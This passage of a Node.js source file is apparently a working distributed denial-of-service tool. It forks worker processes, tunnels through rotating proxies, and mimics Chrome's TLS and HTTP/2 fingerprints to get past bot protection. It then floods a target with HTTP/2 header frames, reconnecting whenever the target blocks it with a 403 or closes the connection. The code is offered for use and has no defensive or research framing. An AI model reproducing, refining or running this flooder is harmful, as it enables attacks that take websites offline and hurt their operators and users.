                                 key !== 'proxyFile' && key !== 'target' && key !== 'parsedTarget')
        .map(([key]) => key)
        .join(', ');
    
    console.log(`\x1b[90mFeatures  :\x1b[0m \x1b[31m${activeFlags || 'Default'}\x1b[0m`);
    
    if (args.debug) {
        console.log(`\x1b[90mDebug     :\x1b[0m \x1b[31mENABLED\x1b[0m`);
    }
    
    console.log("\x1b[90mInitializing attack...\x1b[0m");

    for (let i = 0; i < args.threads; i++) {
        const worker = cluster.fork({ proxies: JSON.stringify(proxies) });
        if (debugMode) {
            worker.on('message', (msg) => {
                if (msg.type === 'status') {
                    const code = msg.code;
                    statusCounts[code] = (statusCounts[code] || 0) + 1;
                } else if (msg.type === 'counter') {
                    totalPacketsSent += msg.count;
                } else if (msg.type === 'debug') {
                    console.log(`[DEBUG] ${msg.msg}`);
                }
            });
        }
    }

    if (args.debug) {
        setInterval(() => {
            const statuses = Object.entries(statusCounts)
                .map(([code, count]) => `${code}: ${count}`)
                .join(', ');
            process.stdout.clearLine();
            process.stdout.cursorTo(0);
            process.stdout.write(`Status: { ${statuses} } | Sent: ${totalPacketsSent}`);
        }, 1000);
    }

    setTimeout(() => {
        console.log("\n\x1b[31mAttack completed!\x1b[0m");
        process.exit(0);
    }, args.time * 1000);

} else {
    const proxies = JSON.parse(process.env.proxies);
    const proxyManager = new ProxyManager(proxies);

    function getRandomProxy() {
        return proxyManager.getProxy();
    }

    let packetsSent = 0;
    let statusCounts = {};

    setInterval(() => {
        if (packetsSent > 0) {
            process.send({ type: 'counter', count: packetsSent });
            packetsSent = 0;
        }
        if (Object.keys(statusCounts).length > 0) {
            Object.entries(statusCounts).forEach(([code, count]) => {
                process.send({ type: 'status', code: code, count: count });
            });
            statusCounts = {};
        }
    }, 250);

    function runAttack() {
        const proxy = getRandomProxy();
        if (!proxy) return;
        const [proxyHost, proxyPort] = proxy.split(':');



        const connectOptions = {
            host: proxyHost,
            port: proxyPort,
            rejectUnauthorized: false
        };

        if (isHttps) {
            connectOptions.servername = parsedTarget.hostname;
            connectOptions.ALPNProtocols = args.httpVersion === 1 ? ['http/1.1'] : ['h2'];
            connectOptions.port = 443;
            connectOptions.ciphers = CIPHERS;
            connectOptions.sigalgs = 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256';
            connectOptions.secureOptions = crypto.constants.SSL_OP_NO_RENEGOTIATION |
                crypto.constants.SSL_OP_NO_TICKET |
                crypto.constants.SSL_OP_NO_SSLv2 |
                crypto.constants.SSL_OP_NO_SSLv3 |
                crypto.constants.SSL_OP_NO_COMPRESSION |
                crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                crypto.constants.SSL_OP_TLSEXT_PADDING |
                crypto.constants.SSL_OP_ALL;
            connectOptions.secure = true;
            connectOptions.minVersion = 'TLSv1.2';
            connectOptions.maxVersion = 'TLSv1.3';
        } else {
            connectOptions.port = 80;
        }

        let client;

        const socketCallback = () => {
            const socket = client;
            if (socket.destroyed) return;

            const chromeSettings = [
                [1, 65536],
                [2, 0],
                [4, 6291456],
                [6, 262144]
            ];
            const chromeSettingsFrame = encodeFrame(0, 4, encodeSettings(chromeSettings));

            const windowUpdateFrame = Buffer.alloc(13);
            windowUpdateFrame.writeUInt32BE(4, 0);
            windowUpdateFrame.writeUInt8(8, 4);
            windowUpdateFrame.writeUInt32BE(0, 5);
            windowUpdateFrame.writeUInt32BE(15663105, 9);

            socket.write(PREFACE);
            socket.write(chromeSettingsFrame);

            const hpack = new HPACK();
            hpack.setTableSize(4096);

            let streamId = 1;
            let handshakeCompleted = false;

            let buffer = Buffer.alloc(0);
            socket.on('data', (chunk) => {
                buffer = Buffer.concat([buffer, chunk]);
                while (buffer.length >= 9) {
                    const length = buffer.readUIntBE(0, 3);
                    const type = buffer.readUInt8(3);
                    const flags = buffer.readUInt8(4);
                    const stream = buffer.readUInt32BE(5);

                    if (buffer.length < 9 + length) break;

                    const frameName = FRAME_TYPES[type] || `UNKNOWN(0x${type.toString(16)})`;
                    if (args.debug) process.send({ type: 'debug', msg: `Rx Frame: ${frameName}` });

                    const framePayload = buffer.slice(9, 9 + length);
                    buffer = buffer.slice(9 + length);

                    if (type === 4) {
                        if (flags & 0x1) {
                            if (args.debug) process.send({ type: 'debug', msg: 'Got Settings ACK' });
                        } else {
                            if (args.debug) process.send({ type: 'debug', msg: 'Got Server Settings -> Sending ACK' });
                            const ackFrame = encodeFrame(0, 4, Buffer.alloc(0), 0x1);
                            socket.write(ackFrame);

                            if (!handshakeCompleted) {
                                handshakeCompleted = true;
                                setTimeout(startFlood, 100);
                            }
                        }
                    } else if (type === 1) {
                        try {
                            const decoded = hpack.decode(framePayload);
                            if (decoded) {
                                const statusPair = decoded.find(pair => pair[0] === ':status');
                                if (statusPair) {
                                    const statusCode = statusPair[1];
                                    if (args.debug) process.send({ type: 'debug', msg: `[+] Status: ${statusCode}` });
                                    process.send({ type: 'status', code: statusCode });
                                    if (statusCode === '403') {
                                        socket.destroy();
                                        return runAttack();
                                    }
                                }
                            }
                        } catch (e) {
                        }
                    } else if (type === 7) {
                        const errorCode = framePayload.readUInt32BE(4);
                        if (args.debug) process.send({ type: 'debug', msg: `GOAWAY: Error ${errorCode}` });
                        socket.destroy();
                    }
                }
            });

            function startFlood() {
                function doWrite() {
                    if (socket.destroyed || !socket.writable) return;

                    // Generate fresh headers for each request
                    const headers = generateEnhancedHeaders(parsedTarget, args);
                    const encodedHeaders = hpack.encode(headers);
                    const frameLen = encodedHeaders.length + 5;

                    const reqBuf = Buffer.alloc(9 + frameLen);
                    reqBuf.writeUInt32BE(frameLen << 8 | 0x1, 0);
                    reqBuf.writeUInt8(0x25, 4);
                    reqBuf.writeUInt32BE(streamId, 5);
                    reqBuf.writeUInt8(0xFF, 13);
                    encodedHeaders.copy(reqBuf, 14);

                    socket.write(reqBuf);
                    streamId += 2;
                    packetsSent += 1;

                    if (packetsSent > 64) {
                        socket.destroy();
                        return runAttack();
                    }

                    const delay = 1000 / args.ratelimit;
                    setTimeout(doWrite, delay);
                }
                doWrite();
            }

            setTimeout(() => {
                if (!handshakeCompleted) {
                    handshakeCompleted = true;
                    startFlood();
                }
            }, 5000);
        };

        if (isHttps) {
            const netSocket = net.connect(Number(proxyPort), proxyHost, () => {
                netSocket.once('data', (chunk) => {
                    if (!chunk.toString().includes('200')) {
                        netSocket.destroy();
                        return runAttack();
                    }

                    const tlsOptions = {
                        socket: netSocket,
                        servername: parsedTarget.hostname,
                        ALPNProtocols: args.httpVersion === 1 ? ['http/1.1'] : ['h2', 'http/1.1'],
                        ciphers: CIPHERS,
                        sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
                        secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION |
                            crypto.constants.SSL_OP_NO_TICKET |
                            crypto.constants.SSL_OP_NO_SSLv2 |
                            crypto.constants.SSL_OP_NO_SSLv3 |
                            crypto.constants.SSL_OP_NO_COMPRESSION |
                            crypto.constants.SSL_OP_ALLOW_UNSAFE_LEGACY_RENEGOTIATION |
                            crypto.constants.SSL_OP_TLSEXT_PADDING |
                            crypto.constants.SSL_OP_ALL,
                        rejectUnauthorized: false,
                        minVersion: 'TLSv1.2',
                        maxVersion: 'TLSv1.3'
                    };

                    client = tls.connect(tlsOptions, socketCallback);
                    client.on('error', (err) => {
                        client.destroy();
                        runAttack();
                    });
                });

                setTimeout(() => {
                    if (!client) {
                        netSocket.destroy();
                        runAttack();
                    }
                }, 5000);
            });

            netSocket.write(`CONNECT ${parsedTarget.hostname}:${targetPort} HTTP/1.1\r\nHost: ${parsedTarget.hostname}:${targetPort}\r\nProxy-Connection: Keep-Alive\r\n\r\n`);

            netSocket.on('error', (err) => {
                netSocket.destroy();
                runAttack();
            });

            netSocket.on('end', () => {
                runAttack();
            });
        } else {
            connectOptions.timeout = 0;
            client = net.connect(connectOptions, socketCallback);
            client.on('error', (err) => {
                client.destroy();
                runAttack();
            });
            client.on('end', () => {
                runAttack();
            });
        }

    }

    const launchInterval = 100 / (args.ratelimit / 10);
    setInterval(runAttack, launchInterval > 0 ? launchInterval : 100);
}